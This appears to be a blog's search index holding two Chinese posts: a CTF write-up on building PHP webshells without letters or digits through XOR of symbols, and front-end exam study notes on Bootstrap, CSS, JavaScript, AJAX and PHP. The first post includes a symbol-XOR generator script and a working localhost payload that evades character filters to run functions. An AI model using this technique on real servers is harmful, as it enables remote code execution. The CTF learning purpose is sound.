<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>无字母数字webshell</title>
      <link href="/2019/12/24/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/"/>
      <url>/2019/12/24/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell/</url>
      <content type="html"><![CDATA[<p>最近ctf经常遇到类似姿势的题目，最开始还是比较蒙的 今天来进行一个总结</p><p>文章参考p牛的博客</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的webshell</a></p><p>无字母数字 如何构造一句话木马。</p><p>这里用到三种方法</p><h2 id="异或构造"><a href="#异或构造" class="headerlink" title="异或构造"></a>异或构造</h2><p>这种方法用到特殊符号的异或最终得到数字或者字母</p><p><img src="https://i.loli.net/2019/12/24/Mr6ueLT4ioX9W8Z.png" alt="QQ截图20191224172326.png"></p><p>如上图</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"~"</span>^<span class="string">"$"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"^"</span>^<span class="string">"&lt;"</span></span><br></pre></td></tr></table></figure><p>即可构造出字母 转换过程为</p><p>将两个要比较的字符转换成<code>ascii</code>之后。进行异或运算后得到了字母</p><p><code>~</code>的<code>ascii</code>值为126    126的二进制为<code>1111110</code></p><p><code>$</code>的<code>ascii</code>值为36       36的二进制为 <code>0100100</code></p><p>两个二进制的值进行异或运算得到 <code>1011010</code>转换成<code>ascii</code>为90 也就是对应大写字母Z</p><p>那么我们如果构造处一句话 不可能一个一个去试对吧 这里贴上一个 异或得到字母的PHP脚本</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $test = <span class="string">'~!@#$%^&amp;*()_+\|/?.,-=&#123;&#125;[]'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($test);$i++)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;strlen($test);$j++)&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(ord($test[$i]^$test[$j])&gt;<span class="number">64</span> &amp;&amp; ord($test[$i]^$test[$j])&lt;<span class="number">91</span>)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $test[$i].<span class="string">'^'</span>.$test[$j].<span class="string">'结果为:'</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $test[$i]^$test[$j];</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ord($test[$i]^$test[$j])&gt;<span class="number">97</span> &amp;&amp; ord($test[$i]^$test[$j])&lt;<span class="number">122</span>)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $test[$i].<span class="string">'^'</span>.$test[$j].<span class="string">'结果为:'</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $test[$i]^$test[$j];</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h2><p>一道简单的题目 首先我们构造异或后为phpinfo的 payload</p><p><img src="https://i.loli.net/2019/12/25/SLyOAbDE3xRmYwU.png" alt="QQ截图20191225085124.png"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-^]p</span><br><span class="line">(^@h</span><br><span class="line">-^]p</span><br><span class="line">)^@i</span><br><span class="line">.^@<span class="built_in">n</span></span><br><span class="line">=^&#123;f</span><br><span class="line">@^/o</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/25/abwvPAHyYMIq5Rh.png" alt="QQ截图20191225085455.png"></p><p>传入的知识phpinfo字符串 最终还需传入括号</p><p>最终payload为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/webshell/</span>ctf.php?code=<span class="variable">$_</span>=<span class="string">'-(-).=@'</span>^<span class="string">']@]@@[/'</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>备考1+x前端证书</title>
      <link href="/2019/12/11/%E5%A4%87%E8%80%831+x%E5%89%8D%E7%AB%AF%E8%AF%81%E4%B9%A6/"/>
      <url>/2019/12/11/%E5%A4%87%E8%80%831+x%E5%89%8D%E7%AB%AF%E8%AF%81%E4%B9%A6/</url>
      <content type="html"><![CDATA[<h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><h3 id="Bootstrap3和Bootstrap4-栅格系统的区别"><a href="#Bootstrap3和Bootstrap4-栅格系统的区别" class="headerlink" title="Bootstrap3和Bootstrap4 栅格系统的区别"></a>Bootstrap3和Bootstrap4 栅格系统的区别</h3><p><code>.container</code>固定宽度</p><p><code>.container-fluid</code> 100%宽度</p><p>Bootstrap3</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">col</span>-xs(&lt;<span class="number">768</span>px)  超小屏幕</span><br><span class="line">.<span class="keyword">col</span>-<span class="keyword">sm</span>(&gt;=<span class="number">768</span>px) 小屏幕</span><br><span class="line">.<span class="keyword">col</span>-md(&gt;=<span class="number">992</span>px) 中等屏幕</span><br><span class="line">.<span class="keyword">col</span>-<span class="keyword">lg</span>(&gt;=<span class="number">1200</span>px) 大屏幕</span><br></pre></td></tr></table></figure><p>Bootstrap4</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">col</span>-(&lt;<span class="number">576</span>px) 超小屏幕</span><br><span class="line">.<span class="keyword">col</span>-<span class="keyword">sm</span>(&gt;=<span class="number">576</span>px) 平板</span><br><span class="line">.<span class="keyword">col</span>-md(&gt;=<span class="number">768</span>px) 桌面显示器</span><br><span class="line">.<span class="keyword">col</span>-<span class="keyword">lg</span>(&gt;=<span class="number">992</span>px) 大桌面显示器</span><br><span class="line">.<span class="keyword">col</span>-xl(&gt;=<span class="number">1200</span>px) 超大桌面显示器</span><br></pre></td></tr></table></figure><h3 id="Bootstrap4-分页"><a href="#Bootstrap4-分页" class="headerlink" title="Bootstrap4 分页"></a>Bootstrap4 分页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"pagination"</span>&gt;</span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-item"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"page-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Previous<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-item"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"page-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-item active"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"page-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-item"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"page-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"page-item"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"page-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Next<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/ul&gt;</span></span><br></pre></td></tr></table></figure><p>核心类名 <code>class=pagination</code> <code>pagination</code> <code>pagination</code> 重要的类名敲三遍</p><p>当前页可以使用 <strong>.active</strong> 类来高亮显示 效果如下:</p><p><img src="https://i.loli.net/2019/12/11/Re6zumoUhGL5B1g.png" alt="QQ截图20191211192453.png"></p><h3 id="Bootstrap4-下拉菜单"><a href="#Bootstrap4-下拉菜单" class="headerlink" title="Bootstrap4 下拉菜单"></a>Bootstrap4 下拉菜单</h3><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown"</span>&gt;</span><br><span class="line">  &lt;button <span class="class"><span class="keyword">type</span></span>=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary dropdown-toggle"</span> data-toggle=<span class="string">"dropdown"</span>&gt;</span><br><span class="line">    <span class="type">Dropdown</span> button</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown-menu"</span>&gt;</span><br><span class="line">    &lt;a <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown-item"</span> href=<span class="string">"#"</span>&gt;<span class="type">Link</span> <span class="number">1</span>&lt;/a&gt;</span><br><span class="line">    &lt;a <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown-item"</span> href=<span class="string">"#"</span>&gt;<span class="type">Link</span> <span class="number">2</span>&lt;/a&gt;</span><br><span class="line">    &lt;a <span class="class"><span class="keyword">class</span></span>=<span class="string">"dropdown-item"</span> href=<span class="string">"#"</span>&gt;<span class="type">Link</span> <span class="number">3</span>&lt;/a&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>核心类名</p><p><code>.dropdown</code> 类用来指定一个下拉菜单。</p><p><code>.dropdown-menu</code> 类来设置实际下拉菜单。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dropdown dropdown dropdown</span><br><span class="line">dropdown-<span class="selector-tag">menu</span> dropdown-<span class="selector-tag">menu</span> dropdown-menu</span><br></pre></td></tr></table></figure><h3 id="Bootstrap4-折叠"><a href="#Bootstrap4-折叠" class="headerlink" title="Bootstrap4 折叠"></a>Bootstrap4 折叠</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;button data-toggle=<span class="string">"collapse"</span> data-target=<span class="string">"#demo"</span>&gt;折叠&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"demo"</span> <span class="built_in">class</span>=<span class="string">"collapse"</span>&gt;</span><br><span class="line">Lorem ipsum dolor <span class="built_in">text</span>....</span><br><span class="line">&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure><p>核心类名 <code>collapse</code></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">collapse</span> <span class="built_in">collapse</span> <span class="built_in">collapse</span></span><br></pre></td></tr></table></figure><h3 id="Bootstrap4-导航"><a href="#Bootstrap4-导航" class="headerlink" title="Bootstrap4 导航"></a>Bootstrap4 导航</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link disabled"</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Disabled<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>核心类名 <code>nav</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nav</span> <span class="selector-tag">nav</span> nav</span><br></pre></td></tr></table></figure><p><strong>响应式导航栏</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.navbar-expand-xl|<span class="type">lg</span>|<span class="type">md</span>|<span class="type">sm</span> 类来创建响应式的导航栏 (大屏幕水平铺开，小屏幕垂直堆叠)。</span><br></pre></td></tr></table></figure><p>例如</p><p><code>.navbar-expand-lg</code> 就是大于lg的宽度 展示全部导航栏 <strong>小于则展示面包屑菜单 折叠导航栏</strong></p><h3 id="实操题重点"><a href="#实操题重点" class="headerlink" title="实操题重点"></a>实操题重点</h3><p><strong>导航栏组件</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">.navbar</span></span><br></pre></td></tr></table></figure><p><strong>表单</strong></p><p>堆叠表单</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">form</span>-<span class="built_in">group</span></span><br></pre></td></tr></table></figure><p>内联表单</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">form-<span class="keyword">inline</span></span><br></pre></td></tr></table></figure><p>按钮</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.btn</span><br><span class="line"><span class="selector-class">.btn</span> btn-info 信息</span><br><span class="line"><span class="selector-class">.btn</span> btn-primary 主要按钮</span><br><span class="line"><span class="selector-class">.btn</span> btn-success 成功</span><br><span class="line"><span class="selector-class">.btn</span> btn-info 信息</span><br><span class="line"><span class="selector-class">.btn</span> btn-danger 危险</span><br><span class="line"><span class="selector-class">.btn</span> btn-link 链接</span><br></pre></td></tr></table></figure><p>输入框组</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">input</span>-<span class="built_in">group</span></span><br></pre></td></tr></table></figure><p>列表组件</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">list</span>-<span class="built_in">group</span></span><br></pre></td></tr></table></figure><h2 id="css"><a href="#css" class="headerlink" title="css"></a>css</h2><h3 id="背景颜色渐变linear-gradient"><a href="#背景颜色渐变linear-gradient" class="headerlink" title="背景颜色渐变linear-gradient"></a>背景颜色渐变linear-gradient</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: linear-gradient(<span class="built_in">to</span> bottom,<span class="keyword">black</span>,white)</span><br></pre></td></tr></table></figure><p>to bottom 表示从上到下</p><p>to right 表示从左到右</p><p>to bottom right 表示从左上角到右下角 渐变</p><h3 id="字体倍数"><a href="#字体倍数" class="headerlink" title="字体倍数"></a>字体倍数</h3><p>以 <code>rem</code>为单位 例如:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">font-<span class="built_in">size</span>: <span class="number">2.25</span><span class="built_in">rem</span>;</span><br></pre></td></tr></table></figure><h3 id="过渡属性transition"><a href="#过渡属性transition" class="headerlink" title="过渡属性transition"></a>过渡属性transition</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">transition:</span>设置过渡的属性名称 规定过渡效果几秒完成 规定速度曲线 定义过渡何时开始(延迟几秒后开始过渡)</span><br></pre></td></tr></table></figure><p>过渡属性同常结合伪类使用</p><p>例如:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#content</span> <span class="selector-tag">h2</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">2.25</span>（<span class="number">13</span>）;<span class="comment">/* 设置字体大小为根元素大小的2.25倍 */</span></span><br><span class="line"><span class="attribute">transition</span>: font-size <span class="number">1s</span>;<span class="comment">/* 使用过渡，1s内标题字号变大 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思为 鼠标经过以后 1秒内 字体变大2.25倍</p><h3 id="盒子阴影box-shadow"><a href="#盒子阴影box-shadow" class="headerlink" title="盒子阴影box-shadow"></a>盒子阴影box-shadow</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">box-shadow</span>: <span class="number">10px</span> <span class="number">5px</span> <span class="number">10px</span> <span class="number">#f00</span>;</span><br></pre></td></tr></table></figure><p>x轴 y轴 阴影大小 阴影颜色</p><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="获取dom对象的几种方式"><a href="#获取dom对象的几种方式" class="headerlink" title="获取dom对象的几种方式"></a>获取dom对象的几种方式</h3><p>通过id名获取标签</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'id名'</span>) <span class="comment">//获取的唯一一个dom对象</span></span><br></pre></td></tr></table></figure><p>通过类名获取标签</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementByClassName(<span class="string">'类名'</span>) <span class="comment">//获取的是一个数组</span></span><br></pre></td></tr></table></figure><p>通过标签名获取标签</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementByTagName(<span class="string">'标签名'</span>) <span class="comment">//获取的是一个数组</span></span><br></pre></td></tr></table></figure><h3 id="操作DOM"><a href="#操作DOM" class="headerlink" title="操作DOM"></a>操作DOM</h3><p>创建DOM对象</p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">div</span> = document.createElement(<span class="string">'div'</span>); //创建<span class="keyword">div</span>标签</span><br></pre></td></tr></table></figure><p>把标签放在某个页面或某个标签中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">父节点<span class="selector-class">.appendChild</span>(子节点)</span><br></pre></td></tr></table></figure><p>删除节点</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">div</span>.<span class="literal">empty</span>() 清空<span class="keyword">div</span>标签的所有子标签和内容</span><br><span class="line"><span class="keyword">div</span>.remove() 清空标签所有子标签和内容 以及清空自己</span><br></pre></td></tr></table></figure><h3 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h3><p>foreach</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">'name'</span>:<span class="string">'Sch0lar'</span>,<span class="string">'age'</span>:<span class="string">'19'</span>,<span class="string">'sex'</span>:<span class="string">'男'</span>&#125;;</span><br><span class="line">    <span class="built_in">Object</span>.keys(obj).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(key,obj[key]);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>for in</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">'0'</span>:<span class="string">'a'</span>,<span class="string">'1'</span>:<span class="string">'b'</span>,<span class="string">'2'</span>:<span class="string">'c'</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(i,<span class="string">":"</span>,obj[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h2><p>之前对ajax并不熟练 考试要考所以重新整理一下</p><h3 id="ajax对象的创建"><a href="#ajax对象的创建" class="headerlink" title="ajax对象的创建"></a>ajax对象的创建</h3><p>主流浏览器 通过 <code>new XMLHttpRequest()</code>获得</p><p>老版浏览器 通过 <code>new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)</code> 获得</p><p>我们可以通过<code>window.XMLHttpRequest</code>来判断浏览器是否支持<code>XMLHttpRequest()</code></p><p><img src="https://i.loli.net/2019/12/15/XO3wzQ48qucnehR.png" alt="QQ截图20191215144444.png"></p><p><strong>window.XMLHttpRequest</strong>  判断浏览器是否支持<code>XMLHttpRequest()</code></p><h3 id="ajax请求服务-服务器返回数据"><a href="#ajax请求服务-服务器返回数据" class="headerlink" title="ajax请求服务 服务器返回数据"></a>ajax请求服务 服务器返回数据</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">'get'</span>,<span class="string">'test.php'</span>) </span><br><span class="line"><span class="comment">//open和服务器进行交互。参数1请求方式 参数2 服务器地址</span></span><br><span class="line">xhr.send()<span class="comment">//发出请求</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; <span class="comment">//监听</span></span><br><span class="line"><span class="keyword">if</span>(xhr.readyState ==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">200</span>)</span><br><span class="line">    alert(xhr.responseText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/15/eDsB8wCY1io7uPg.png" alt="图片1.png"></p><h3 id="get-post区别"><a href="#get-post区别" class="headerlink" title="get post区别"></a>get post区别</h3><p>POST与GET不同的是 POST方式需要设置头信息，并将数据通过send()方法发送 </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">文件头信息</span><br><span class="line"><span class="selector-tag">xhr</span><span class="selector-class">.setRequestHeader</span>(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/15/pGMDUaoW5Ygr7SL.png" alt="QQ截图20191215152620.png"></p><p><img src="https://i.loli.net/2019/12/15/qDSQGIhgHbfEda6.png" alt="QQ截图20191215152654.png"></p><h3 id="数据传输时字符串转码"><a href="#数据传输时字符串转码" class="headerlink" title="数据传输时字符串转码"></a>数据传输时字符串转码</h3><p><img src="https://i.loli.net/2019/12/15/lPHhKVIFXvNWE8q.png" alt="QQ截图20191215154311.png"></p><p>例如我只想传一个参数 <code>content</code>参数值为<code>Sch0lar&amp;age</code> 可以看到这里&amp;符号将age也解析为了一个参数 解决办法就是url编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span> 函数进行转码 之后在输入到服务器</span><br></pre></td></tr></table></figure><p>因为get方式有自解码机制所以 也不会有任何错误</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">encodeURIComponent(<span class="name">content</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/15/DMfvpJxANyatnhX.png" alt="QQ截图20191215154208.png"></p><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="封装mysqli"><a href="#封装mysqli" class="headerlink" title="封装mysqli"></a>封装mysqli</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 